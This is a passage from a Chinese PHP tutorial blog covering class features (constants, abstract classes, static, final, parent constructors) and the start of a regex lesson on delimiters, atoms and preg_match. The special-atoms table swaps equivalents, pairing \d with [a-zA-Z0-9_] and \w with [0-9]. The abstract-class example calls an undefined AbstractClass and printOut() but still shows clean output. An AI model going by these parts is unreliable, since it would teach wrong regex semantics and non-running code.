<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 声明一个&#x27;iTemplate&#x27;接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">iTemplate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$var</span></span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span>(<span class="params"><span class="variable">$template</span></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 实现接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> <span class="keyword">implements</span> <span class="title">iTemplate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vars</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vars[<span class="variable">$name</span>] = <span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span>(<span class="params"><span class="variable">$template</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;vars <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$template</span> = str_replace(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$name</span> . <span class="string">&#x27;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$template</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$template</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>7. 常量</strong></font><br>可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用<font color="#FF7F00"> $ </font>符号。<br>常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。<br>自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字（如 self，parent 或 static）。<br></font> </p>
<p>示例代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class MyClass</span><br><span class="line"> &#123;</span><br><span class="line">     const constant = <span class="string">&#x27;常量值&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">function</span> <span class="function"><span class="title">showConstant</span></span>() &#123;</span><br><span class="line">         <span class="built_in">echo</span>  self::constant . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> MyClass::constant . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$classname</span> = <span class="string">&quot;MyClass&quot;</span>;</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$classname</span>::constant . <span class="string">&quot;&lt;br/&gt;&quot;</span>; // 自 5.3.0 起</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$class</span> = new MyClass();</span><br><span class="line"> <span class="variable">$class</span>-&gt;showConstant();</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$class</span>::constant . <span class="string">&quot;&lt;br/&gt;&quot;</span>; // 自 PHP 5.3.0 起</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>8. 抽象类</strong></font><br>任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。<br>定义为抽象的类不能被实例化。<br>被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。<br>继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。例如某个抽象方法被声明为受保护的，那么<br>子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。此外方法的调用方式必须匹配，即类型和所需参数数量必须一致。例如，子类定义了一个可选参数，而父类抽象方法的声明里没有，则两者的声明并无冲突。<br></font> </p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass1</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ConcreteClass1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span>(<span class="params"><span class="variable">$prefix</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">&#123;$prefix&#125;</span>ConcreteClass1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass2</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ConcreteClass2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span>(<span class="params"><span class="variable">$prefix</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">&#123;$prefix&#125;</span>ConcreteClass2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> ConcreteClass1;</span><br><span class="line"><span class="variable">$class1</span>-&gt;printOut();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class1</span>-&gt;prefixValue(<span class="string">&#x27;FOO_&#x27;</span>) . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$class2</span> = <span class="keyword">new</span> ConcreteClass2;</span><br><span class="line"><span class="variable">$class2</span>-&gt;printOut();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class2</span>-&gt;prefixValue(<span class="string">&#x27;FOO_&#x27;</span>) . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">ConcreteClass1</span><br><span class="line">FOO_ConcreteClass1</span><br><span class="line">ConcreteClass2</span><br><span class="line">FOO_ConcreteClass2</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>9. Static 关键字</strong></font><br>声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。<br>静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。<br>由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。<br>静态属性不可以由对象通过 -&gt; 操作符来访问。<br>自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字 self，parent 或 static。<br></font> </p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$my_static</span> = <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">staticValue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$my_static</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> Foo::<span class="variable">$my_static</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$foo</span>-&gt;staticValue() . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">foo</span><br><span class="line">foo</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>10. Final 关键字</strong></font><br>PHP 5 新增了一个 final 关键字。如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。<br></font></p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;BaseClass::test() called&quot;</span> . PHP_EOL;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moreTesting</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;BaseClass::moreTesting() called&quot;</span>  . PHP_EOL;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">ChildClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moreTesting</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;ChildClass::moreTesting() called&quot;</span>  . PHP_EOL;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 报错信息 Fatal error: Cannot override final method BaseClass::moreTesting()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">Fatal <span class="built_in">error</span>:  Cannot override <span class="keyword">final</span> method BaseClass::moreTesting() in D:\WWW\Basis\oop\opp_9.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>11.调用父类构造方法</strong></font><br>PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct()<br></font> </p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;BaseClass 类中构造方法&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="built_in">parent</span>::__construct();  <span class="comment">// 子类构造方法不能自动调用父类的构造方法</span></span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;SubClass 类中构造方法&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">OtherSubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 继承 BaseClass 的构造方法</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> BaseClass();</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用 BaseClass、SubClass 构造方法</span></span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> SubClass();</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> OtherSubClass();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">BaseClass 类中构造方法</span><br><span class="line">BaseClass 类中构造方法</span><br><span class="line">SubClass 类中构造方法</span><br><span class="line">BaseClass 类中构造方法</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-9-PHP-函数"><a href="#1-9-PHP-函数" class="headerlink" title="1.9 PHP 函数"></a><font color="#3CB371" face="Comic sans MS">1.9 PHP 函数</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-function">参见本站博客：PHP-函数</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-PHP-正则表达式"><a href="#二、-PHP-正则表达式" class="headerlink" title="二、 PHP 正则表达式"></a><font color="#FF6347" face="Comic sans MS">二、 PHP 正则表达式</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-Regular-Expression">参见本站博客：PHP-正则表达式</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三、-PHP-文件系统"><a href="#三、-PHP-文件系统" class="headerlink" title="三、 PHP 文件系统"></a><font color="#FF6347" face="Comic sans MS">三、 PHP 文件系统</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-FileSystem">参见本站博客：PHP-文件系统</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四、-PHP-文件上传"><a href="#四、-PHP-文件上传" class="headerlink" title="四、 PHP 文件上传"></a><font color="#FF6347" face="Comic sans MS">四、 PHP 文件上传</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-Upload">参见本站博客：PHP-文件上传</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五、-MySQL入门"><a href="#五、-MySQL入门" class="headerlink" title="五、 MySQL入门"></a><font color="#FF6347" face="Comic sans MS">五、 MySQL入门</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/MySQL-Primer">参见本站博客：MySQL入门</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="六、-PHP操作MySQL数据库"><a href="#六、-PHP操作MySQL数据库" class="headerlink" title="六、 PHP操作MySQL数据库"></a><font color="#FF6347" face="Comic sans MS">六、 PHP操作MySQL数据库</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.top/post/PHP-MySQL">参见本站博客：PHP操作MySQL数据库</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="七、-PHP会话管理和控制"><a href="#七、-PHP会话管理和控制" class="headerlink" title="七、 PHP会话管理和控制"></a><font color="#FF6347" face="Comic sans MS">七、 PHP会话管理和控制</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.top/post/PHP-SessionManagement">参见本站博客：PHP-会话管理和控制</a>]</strong></font><br></font></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-正则表达式</title>
    <url>/post/PHP-Regular-Expression/</url>
    <content><![CDATA[<p>世界上最难懂的是道士的鬼符、医生的处方和程序员的正则表达示。(ง •_•)ง</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 正则表达式</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<p><font color="red"><strong>正则表达示我们其实之前经常看到，它主要用在以下一些地方：</strong></font><br>1.匹配邮箱、手机号码、验证码<br>2.替换敏感的关键词。例如：涉及政治和骂人的话<br>3.文章采集。<br>4.早期的表情替换技术,ubb文件编码、markdown编辑器替换等<br>5.以后自己写模板引擎也需要用到正则表达示<br>其他….<br><font face="Comic sans MS"></font></p>
<blockquote>
<p>正则表达式是一种描述字符串结果的语法规则，是一个特定的格式化模式，可以匹配、替换、截取匹配的字符串。<font color="#00B2EE"><strong>常用的语言基本上都有正则表达式，如JavaScript、java</strong></font>等。其实，只有了解一种语言的正则使用，其他语言的正则使用起来，就相对简单些。文本主要围绕解决下面问题展开。</p>
</blockquote>
<hr>
<hr>
<h3 id="1-定界符"><a href="#1-定界符" class="headerlink" title="1. 定界符"></a><font color="#FF6347" face="Comic sans MS">1. 定界符</font></h3><p><font face="Comic sans MS">定界符，就是定一个边界，边界以内的就是正则表达示。<br>PHP的正则表达示定界符的规定如下：<br>定界符，<font color="#00B2EE"><strong>不能用a-zA-Z0-9\ 其他的都可以用。必须成对出现，有开始就有结束。</strong></font><br>我们来例几个例子：<br></font></p>
<table>
<thead>
<tr>
<th align="center">例子</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&#x2F;中间写正则&#x2F;</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">$中间写正则$</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">%中间写正则%</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">^中间写正则^</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">@中间写正则@</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">#中间写正则#</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">(中间写正则)</td>
<td align="center">错误</td>
</tr>
<tr>
<td align="center">A中间写正则A</td>
<td align="center">错误</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="2-转义字符"><a href="#2-转义字符" class="headerlink" title=" 2. 转义字符 "></a><font face="Comic sans MS" color="#FF6347"> 2. 转义字符 </font></h3><p><font face="Comic sans MS">注：<font color="#FF7F00">\ </font>是转义字符，如果在以后正则表达示里面需要匹配&#x2F;，如下：<br>&#x2F; &#x2F; &#x2F;<br>这个时候真要匹配&#x2F; 的时候，需要把定界符里面的&#x2F; 用转义字符转义一下，写成下面的例子：<br>&#x2F; <font color="#FF7F00">&lt;&#x2F;font&gt;&#x2F; &#x2F;<br>如果你觉得麻烦，遇到这种需要转义的字符的时候可以把两个正斜线（&#x2F; &#x2F;）定界，改为其他的定界符（# #）。<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="3-原子"><a href="#3-原子" class="headerlink" title=" 3. 原子 "></a><font face="Comic sans MS"><font color="#FF6347"> 3. 原子 </font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>原子</strong></font>是正则表达示里面的最小单位，原子说白了就是需要匹配的内容。一个成立的正则表达示当中必须最少要有一个原子。<br><font color="#00B2EE"><strong>所有可见不可见的字符就是原子！</strong></font><br><font color="red"><strong>说明：</strong></font>我们见到的空格、回车、换行、0-9、A-Za-z、中文、标点符号、特殊符号全为原子。<br>在做原子的实例前我们先来讲解一个函数,preg_match:<br><font color="red">int preg_match ( string $正则 , string $字符串 [, array &amp;$结果] )</font><br>功能：根据$正则变量，匹配$字符串变量。如果存在则返回匹配的个数，把匹配到的结果放到$结果变量里。如果没有匹配到结果返回0。<br><strong>注：</strong>上面是preg_match常用的主要几个参数。我在上面将另外几个参数没有列出来。因为，另外两个参数太不常用了。<br>我们来通过实验来证明：<br></font></p>
<p><font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//定义一个变量叫zz，放正则表达示。为了方便大家记忆，如果你英文比较ok，建议把变量名还是写成</span><br><span class="line">//英文的<span class="variable">$pattern</span>。</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/a/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;ddfdjjvi2jfvkwkfi24&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为我希望的是匹配a，而$string当是是不存在a的，所以不成功。</p>
</blockquote>
<p><font color="#FF6347">(2)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/wq/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;ssssswqaaaaaa&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>上面的字符串中s后存在wq，因此匹配成功。</p>
</blockquote>
<p>接下来我们匹配一个空格试试：<br><font color="#FF6347">(3)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/ /&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;sssssw aaaaa&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(1) <span class="string">&quot; &quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>因上，$string这个变量的w字符后存在一个空格。所以匹配成功，输出了字符串类型，长度为1。只不过我们的肉眼不可见，看不到这个字符串而已。</p>
</blockquote>
<p>&amp;emsp;</p>
<h3 id="4-特殊标识的原子"><a href="#4-特殊标识的原子" class="headerlink" title="4. 特殊标识的原子"></a><font face="Comic sans MS" color="#FF6347">4. 特殊标识的原子</font></h3><table>
<thead>
<tr>
<th align="center">原子</th>
<th align="left">说明</th>
<th align="left">等价式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\d</td>
<td align="left">匹配一个0-9</td>
<td align="left">[a-zA-Z0-9_]</td>
</tr>
<tr>
<td align="center">\D</td>
<td align="left">除了0-9以外的所有字符</td>
<td align="left">[^a-zA-Z0-9_]</td>
</tr>
<tr>
<td align="center">\w</td>
<td align="left">a-zA-Z0-9_</td>
<td align="left">[0-9]</td>
</tr>
<tr>
<td align="center">\W</td>
<td align="left">除了0-9A-Za-z_以外的所有字符</td>
<td align="left">[^0-9]</td>
</tr>
<tr>
<td align="center">\s</td>
<td align="left">匹配所有空白字符\n \t \r 空格</td>
<td align="left">[ \t\n\f\r]</td>
</tr>
<tr>
<td align="center">\S</td>
<td align="left">匹配所有非空白字符</td>
<td align="left">[^ \t\n\f\r]</td>
</tr>
<tr>
<td align="center">[ ]</td>
<td align="left">指定范围的原子</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><font color="#FF6347">这个个需要记住，最好达到默写级别。记忆的时候成对记忆，\d是匹配一个0-9，那么\D 就是除了0-9以外的所有字符。上面已经说明的很清楚了，我们进行实验一步一步对这些进行学习。</font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. \d匹配一个0-9</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\d/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;我爱喝9你爱不爱喝&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. \D匹配一个非0-9的值</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\D/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;121243中23453453&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，匹配到了中。因为它不是0-9之间的字符。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. \w匹配一个a-zA-Z0-9_</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;新中_国万岁呀万岁&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，匹配到了下划线。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. \W匹配一个非a-zA-Z0-9_</strong></font><br></font></p>
